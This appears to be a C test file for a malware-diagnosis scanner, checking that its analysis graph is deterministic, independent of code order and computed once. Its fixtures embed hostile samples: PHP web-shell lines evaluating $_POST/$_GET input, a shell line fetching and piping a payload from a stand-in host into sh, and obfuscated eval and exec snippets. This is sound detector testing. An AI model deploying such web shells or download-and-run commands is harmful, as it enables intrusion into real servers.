/*
 * genome / diag_properties - the PROPERTIES of the diagnose scan, asked of the stage as a whole and not of one defect: what a scan must
 * satisfy whatever program it reads.
 *
 *   P1 DETERMINISM   one input scanned again, and again under a different heap (a pad of random blocks held across the scan, so that every
 *                    address the scan sees differs, and with them the SEEDED hash of the text route's tables, G1) gives one graph: the nodes, the
 *                    places, the inputs, the status. Binary seeds (ELF, ET_REL, PE) and one text per language.
 *   P2 ORDER         a program is a set of functions (a script, a set of statements over disjoint variables) and the graph is a function of the
 *                    program and not of the order they are laid out in: the multiset of nodes, each by its capability and by the capabilities,
 *                    roles and kinds of what it takes its inputs from, is the same over every permutation of four functions (24 layouts) and of
 *                    four PHP blocks (24). The class of defect W1 belongs to (a link that crosses `ret` into the next function) is exactly a
 *                    failure of this property.
 *   P3 IDEMPOTENCE   giving back the decode trace (kgenome_diag_walk_trim) and asking for the functions again answers the same table; the walk is
 *                    filled by one reader and read by the next without a second decode.
 *   P4 WORK ONCE     the counters the engine reads: a walk decodes the object once for the scan and the functions that share it
 *                    (kgenome_diag_walk_runs), the lineage stages solve a function at most once for each stage that asks (runs <= fns * stages),
 *                    and the text route's constants and names reach the callbacks once each, in order. Rows marked GBIN2 print the measured value:
 *                    the pending fix_gbin2 patch changes what the stages solve, and a bound is asserted, not the number.
 *
 * usage: diag_properties
 */
#include "../../fuzz/diag/diag_seed.h"

static uint64_t mix(uint64_t h, uint64_t v)
{
	return (h ^ v) * 0x100000001b3ull;
}

/* ---- the graph as a layout-free value ------------------------------------------------------------------------------------------ */

/* the canonical key of a node: its capability and what its inputs come from, by the capability of the origin and not by its index */
static uint64_t node_key(const struct kgenome_diag_scan *s, uint32_t i)
{
	const struct kgenome_diag_hit *h = kgenome_diag_scan_at(s, i);
	uint64_t keys[4], k = mix(0x9e3779b97f4a7c15ull, h->cap);
	unsigned q, m = 0, j;

	for (q = 0; q < h->n_in && q < 4u; q++) {
		const struct kgenome_diag_in *x = &h->in[q];
		uint16_t oc = x->from < kgenome_diag_scan_count(s) ? kgenome_diag_scan_at(s, x->from)->cap : (uint16_t)(0xf000u + x->from);

		keys[m++] = mix(mix(mix(oc, x->role), x->how), x->kind);
	}
	for (q = 1; q < m; q++)                                  /* the inputs are a set */
		for (j = q; j > 0 && keys[j - 1u] > keys[j]; j--) {
			uint64_t t = keys[j];

			keys[j] = keys[j - 1u];
			keys[j - 1u] = t;
		}
	for (q = 0; q < m; q++)
		k = mix(k, keys[q]);
	return k;
}

static int u64_cmp(const void *a, const void *b)
{
	uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b;

	return x < y ? -1 : x > y;
}

/* the multiset of node keys, as one number (sorted, then folded) and the node count */
static uint64_t bag(const struct kgenome_diag_scan *s, uint32_t *count)
{
	static uint64_t k[4096];
	uint32_t i, n = kgenome_diag_scan_count(s);
	uint64_t h = 0xcbf29ce484222325ull;

	if (n > 4096u)
		n = 4096u;
	for (i = 0; i < n; i++)
		k[i] = node_key(s, i);
	qsort(k, n, sizeof k[0], u64_cmp);
	for (i = 0; i < n; i++)
		h = mix(h, k[i]);
	*count = n;
	return mix(h, (uint64_t)kgenome_diag_scan_status(s));
}

/* ---- P1 ------------------------------------------------------------------------------------------------------------------------- */

static void *pad[64];

static void pad_heap(unsigned seed)
{
	unsigned i;

	for (i = 0; i < 64u; i++) {
		seed = seed * 1103515245u + 12345u;
		pad[i] = malloc(1u + (seed >> 8) % 60000u);
	}
}

static void unpad(void)
{
	unsigned i;

	for (i = 0; i < 64u; i++) {
		free(pad[i]);
		pad[i] = NULL;
	}
}

static uint64_t nodes_seen;

static uint64_t bin_sig(const uint8_t *img, size_t n, int pe, int et_rel)
{
	static struct kgenome_elf_info ei;
	static struct kgenome_pe_info pi;
	struct kgenome_obj o;
	struct kgenome_diag_scan *s;
	struct kgenome_diag_inputs in;
	struct kgenome_budget bud;
	uint64_t h;

	(void)et_rel;
	memset(&o, 0, sizeof o);
	memset(&ei, 0, sizeof ei);
	memset(&pi, 0, sizeof pi);
	if (pe ? !kgenome_pe_image_parse(kof_buf_make(img, n), &pi, &o) : !kgenome_elf_image_parse(kof_buf_make(img, n), &ei, &o))
		return 2;
	o.file_header = pe ? (const void *)&pi : (const void *)&ei;
	kgenome_budget_default(&bud, n, kgenome_diag_code_bytes(&o, n));
	bud.max_insn = bud.max_insn_resolve = 20000;
	memset(&in, 0, sizeof in);
	in.budget = &bud;
	in.lineage_stages = KGENOME_LINEAGE_S_ALL;
	s = kgenome_diag_scan_with_inputs(&o, img, n, KGENOME_DIAG_RUN_ALL, &in);
	if (!s)
		return 3;
	{
		uint32_t cnt, no = kgenome_diag_oblig_count(s), i;

		h = mix(bag(s, &cnt), ds_graph_sig(s) + 1u);       /* the empty graph is a graph: its bag and its signature are equal, and a plain xor of them is zero */
		nodes_seen += cnt;
		h = mix(h, no);
		for (i = 0; i < no; i++)
			h = mix(h, kgenome_diag_oblig_at(s, i)->why);
	}
	kgenome_diag_scan_free(s);
	return h;
}

static uint64_t text_sig(uint32_t lang, const char *src)
{
	struct kgenome_diag_text_work w;
	struct kgenome_diag_text_req rq;
	struct kgenome_diag_scan *s;
	uint64_t h;
	uint32_t cnt;

	memset(&w, 0, sizeof w);
	memset(&rq, 0, sizeof rq);
	rq.base = (const uint8_t *)src;
	rq.size = strlen(src);
	rq.lang = lang;
	rq.work = &w;
	s = kgenome_diag_scan_text(&rq);
	if (!s)
		return 1;
	h = mix(mix(bag(s, &cnt), ds_graph_sig(s) + 1u), kgenome_diag_scan_eval_cut(s));
	nodes_seen += cnt;
	kgenome_diag_scan_free(s);
	return mix(h, w.edges);                                  /* not probes: they follow the seeded hash */
}

static void p1(void)
{
	uint64_t before;

	static uint8_t img[0x2000];
	static struct ds_code code;
	static struct hk_pe pe;
	unsigned i, r;
	uint64_t want;
	static const struct { uint32_t lang; const char *text; } T[] = {
		{ KGENOME_TEXTUAL_LANG_PHP, "<?php function x($t){ return gzuncompress(base64_decode($t)); }\n$f=str_replace('k','','ckrekatek_fuknkkction'); $s=$f('',$_POST[0]); $s();\neval(x($_POST[1]));\n$a1='system'; $a2=$a1; $a2($_GET[3]);\n" },
		{ KGENOME_TEXTUAL_LANG_SH, "#!/bin/sh\nx=/tmp/a\nwget -O $x http://e.com/x\nchmod +x $x\nsh $x\ncurl http://e.com/p | sh\n" },
		{ KGENOME_TEXTUAL_LANG_JS, "var a = atob(s); var f = 'ev' + 'al'; window[f](a); function h(p) { return p; } eval(h(a));\n" },
		{ KGENOME_TEXTUAL_LANG_PY, "import os, base64\nd = base64.b64decode(s)\ndef run(cmd):\n    os.system(cmd)\nrun(d)\nexec(d)\n" },
		{ KGENOME_TEXTUAL_LANG_VBS, "a = Request(\"x\")\r\nFunction f(b)\r\nDim c, d\r\nc = b\r\nCreateObject(\"WScript.Shell\").Run c\r\nf = c\r\nEnd Function\r\nExecute f(a)\r\n" },
		{ KGENOME_TEXTUAL_LANG_PERL, "my $c = $ENV{'C'};\nsystem($c);\neval($c);\n" },
	};

	for (i = 0; i < DS_NPROG; i++) {
		size_t n;

		ds_prog(&code, i);
		n = ds_elf64(img, &code, 0x3e);
		want = bin_sig(img, n, 0, 0);
		CK(want > 3u);
		for (r = 0; r < 24u; r++) {
			uint64_t got;

			pad_heap(r * 7919u + i);
			got = bin_sig(img, n, 0, 0);
			unpad();
			if (got != want) {
				printf("  FAIL P1 elf64 prog %u run %u: the graph changed with the heap\n", i, r);
				hk_fails++;
				break;
			}
		}
	}
	for (i = 0; i < DS_NKO; i++) {
		size_t n = ds_ko(img, i);

		want = bin_sig(img, n, 0, 1);
		CK(want > 3u);
		for (r = 0; r < 16u; r++) {
			uint64_t got;

			pad_heap(r * 31u + i);
			got = bin_sig(img, n, 0, 1);
			unpad();
			CK(got == want);
		}
	}
	for (i = 0; i < 8u; i++) {
		ds_pe(&pe, i);
		want = bin_sig(pe.b, pe.n, 1, 0);
		CK(want > 3u);
		for (r = 0; r < 12u; r++) {
			uint64_t got;

			pad_heap(r * 101u + i);
			got = bin_sig(pe.b, pe.n, 1, 0);
			unpad();
			CK(got == want);
		}
	}
	for (i = 0; i < sizeof T / sizeof T[0]; i++) {
		before = nodes_seen;
		want = text_sig(T[i].lang, T[i].text);
		CK(want > 3u);
		CK(nodes_seen > before);                          /* the control of the row: the text has nodes, so equal means something */
		for (r = 0; r < 64u; r++) {
			uint64_t got;

			pad_heap(r * 2654435761u + i);
			got = text_sig(T[i].lang, T[i].text);
			unpad();
			if (got != want) {
				printf("  FAIL P1 text lang %u run %u: the graph changed with the heap (the seed of the hash)\n", T[i].lang, r);
				hk_fails++;
				break;
			}
		}
	}
}

/* ---- P2 ------------------------------------------------------------------------------------------------------------------------- */

/* four independent functions, each ending in ret; the entry is the first function laid out */
static void fn_body(struct ds_code *c, unsigned which)
{
	switch (which) {
	case 0: ds_sock(c); ds_mov_rdi_rax(c); ds_write_sys(c); break;                          /* socket then write of it */
	case 1: ds_sock(c); DS_E(c, 0xb8, 3, 0, 0, 0, 0x0f, 0x05); break;                       /* socket, then close(rdi): the descriptor is still in rdi */
	case 2: DS_E(c, 0xb8, 9, 0, 0, 0, 0x31, 0xff, 0xbe, 0, 0x10, 0, 0, 0xba, 7, 0, 0, 0, 0x0f, 0x05, 0xff, 0xd0); break;   /* mmap RWX, call it */
	default: DS_E(c, 0xb8, 1, 0, 0, 0, 0x0f, 0x05); break;                                  /* a write with nothing before it */
	}
	ds_ret(c);
}

/* the idx-th permutation of 0..3 (the factorial number system) */
static void permute(unsigned idx, unsigned *p)
{
	unsigned avail[4] = { 0, 1, 2, 3 }, left = 4, i, f = 6;

	for (i = 0; i < 4u; i++) {
		unsigned q = idx / f, j;

		idx %= f;
		p[i] = avail[q];
		for (j = q; j + 1u < left; j++)
			avail[j] = avail[j + 1u];
		left--;
		if (left > 1u)
			f /= left;
	}
}

static const char *const BLK[4] = {
	"$a1 = $_GET[0]; system($a1);\n",
	"$b1 = $_POST[0]; eval($b1);\n",
	"$c1 = base64_decode($_GET[1]); exec($c1);\n",
	"$d1 = 'sys' . 'tem'; $d1($_GET[2]);\n",
};

static void p2(void)
{
	static uint8_t img[0x2000];
	static struct ds_code code;
	uint64_t want_bin = 0, want_txt = 0;
	uint32_t want_bin_n = 0, want_txt_n = 0;
	unsigned idx;

	for (idx = 0; idx < 24u; idx++) {
		unsigned p[4], k;
		size_t n;
		struct kgenome_elf_info ei;
		struct kgenome_obj o;
		struct kgenome_diag_scan *s;
		uint32_t cnt;
		uint64_t b;
		char txt[512];
		struct kgenome_diag_text_req rq;

		permute(idx, p);
		code.n = 0;
		for (k = 0; k < 4u; k++) {
			fn_body(&code, p[k]);
			ds_pad(&code, 16);
		}
		n = ds_elf64(img, &code, 0x3e);
		memset(&o, 0, sizeof o);
		memset(&ei, 0, sizeof ei);
		CK(kgenome_elf_image_parse(kof_buf_make(img, n), &ei, &o));
		o.file_header = &ei;
		s = kgenome_diag_scan_with(&o, img, n, KGENOME_DIAG_RUN_SYSCALL);
		CK(s != NULL);
		if (s) {
			b = bag(s, &cnt);
			if (!idx) {
				want_bin = b;
				want_bin_n = cnt;
				CK(cnt >= 4u);                    /* the control: every function made its node */
			} else if (b != want_bin || cnt != want_bin_n) {
				printf("  FAIL P2 binary: layout %u (functions %u %u %u %u) is another graph (%u nodes against %u)\n", idx, p[0], p[1], p[2], p[3], cnt, want_bin_n);
				hk_fails++;
			}
			kgenome_diag_scan_free(s);
		}
		snprintf(txt, sizeof txt, "<?php\n%s%s%s%s", BLK[p[0]], BLK[p[1]], BLK[p[2]], BLK[p[3]]);
		memset(&rq, 0, sizeof rq);
		rq.base = (const uint8_t *)txt;
		rq.size = strlen(txt);
		rq.lang = KGENOME_TEXTUAL_LANG_PHP;
		s = kgenome_diag_scan_text(&rq);
		CK(s != NULL);
		if (s) {
			b = bag(s, &cnt);
			if (!idx) {
				want_txt = b;
				want_txt_n = cnt;
				CK(cnt >= 4u);
			} else if (b != want_txt || cnt != want_txt_n) {
				printf("  FAIL P2 text: block order %u %u %u %u is another graph (%u nodes against %u)\n", p[0], p[1], p[2], p[3], cnt, want_txt_n);
				hk_fails++;
			}
			kgenome_diag_scan_free(s);
		}
	}
}

/* ---- P3 and P4 ------------------------------------------------------------------------------------------------------------------ */

static int funcs_same(const struct kgenome_func_set *a, const struct kgenome_func_set *b)
{
	uint32_t i;

	if (a->n != b->n)
		return 0;
	for (i = 0; i < a->n; i++)
		if (a->v[i].off != b->v[i].off || a->v[i].len != b->v[i].len)
			return 0;
	return 1;
}

static void p3_p4(void)
{
	static uint8_t img[0x2000];
	static struct ds_code code;
	unsigned i;
	double worst = 0;

	for (i = 0; i < DS_NPROG; i++) {
		struct kgenome_elf_info ei;
		struct kgenome_obj o;
		size_t n;
		struct kgenome_diag_walk *wk = kgenome_diag_walk_new();
		struct kgenome_func_set f1, f2;
		struct kgenome_diag_inputs in;
		struct kgenome_diag_scan *s;
		struct kgenome_diag_lineage_stats ls;
		uint32_t runs_after_funcs;

		CK(wk != NULL);
		ds_prog(&code, i);
		n = ds_elf64(img, &code, 0x3e);
		memset(&o, 0, sizeof o);
		memset(&ei, 0, sizeof ei);
		CK(kgenome_elf_image_parse(kof_buf_make(img, n), &ei, &o));
		o.file_header = &ei;
		memset(&f1, 0, sizeof f1);
		memset(&f2, 0, sizeof f2);
		/* P3: the functions, the trace given back, the functions again */
		kgenome_diag_funcs_with_walk(&o, img, n, wk, 1, &f1);
		runs_after_funcs = kgenome_diag_walk_runs(wk);
		kgenome_diag_walk_trim(wk);
		kgenome_diag_funcs_with_walk(&o, img, n, wk, 1, &f2);
		CK(funcs_same(&f1, &f2));
		/* P4: the scan that shares the walk reads the same decode */
		memset(&in, 0, sizeof in);
		in.walk = wk;
		in.lineage_stages = KGENOME_LINEAGE_S_ALL;
		s = kgenome_diag_scan_with_inputs(&o, img, n, KGENOME_DIAG_RUN_SYSCALL | KGENOME_DIAG_RUN_SYMBOL | KGENOME_DIAG_RUN_LINEAGE, &in);
		CK(s != NULL);
		if (s) {
			memset(&ls, 0, sizeof ls);
			if (kgenome_diag_lineage_stats_of(s, &ls)) {
				double ratio = ls.fns ? (double)ls.runs / (double)ls.fns : 1.0;

				CK(ls.runs >= ls.fns);
				CK(ls.runs <= 4u * ls.fns + 4u);          /* a function is solved once for each stage that asks for it again */
				if (ratio > worst)
					worst = ratio;
			}
			kgenome_diag_scan_free(s);
		}
		CK(runs_after_funcs >= 1u);
		CK(kgenome_diag_walk_runs(wk) <= 3u);             /* the decode of the object: the functions, the trace asked again, the scan: one decode each at most */
		printf("  GBIN2 prog %u: walk decoded %u time(s) after the functions, %u in all\n", i, runs_after_funcs, kgenome_diag_walk_runs(wk));
		if (f1.v)
			kgenome_funcs_free(&f1);
		if (f2.v)
			kgenome_funcs_free(&f2);
		kgenome_diag_walk_free(wk);
	}
	printf("  GBIN2 worst solves per function over the programs: %.2f\n", worst);
}

int main(int argc, char **argv)
{
	hk_args(argc, argv);
	p1();
	p2();
	p3_p4();
	printf("diag_properties: %d failure(s)\n", hk_fails);
	return hk_fails != 0;
}
